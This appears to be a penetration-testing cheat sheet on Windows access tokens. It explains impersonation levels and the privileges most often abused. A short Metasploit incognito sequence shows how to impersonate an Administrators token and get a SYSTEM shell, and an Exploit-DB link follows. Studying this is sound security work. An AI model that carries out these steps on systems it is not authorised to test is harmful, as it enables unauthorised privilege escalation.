## Imersonating Windows Token Privileges
```
There are two types of access tokens:

primary access tokens: those associated with a user account that are generated on log on
impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
For an impersonation token, there are different levels:

SecurityAnonymous: current user/client cannot impersonate another user/client
SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
SecurityImpersonation: current user/client can impersonate the client's security context on the local system
SecurityDelegation: current user/client can impersonate the client's security context on a remote system
where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

SeImpersonatePrivilege <== THIS IS THE IMPORTANT PRIV THAT WE WANT TO SEE
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
```

## (Metasploit)
```
load incognito
list tokens -g
impersonate_token "BUILTIN\Administrators"
run ps to get a list of processes with NT AUTHORITY\SYSTEM
migrate to the new process
run shell and you should have SYSTEM shell
```

## Abusing Token Privileges - More Reading
```
[Exploit-DB] https://www.exploit-db.com/papers/42556
```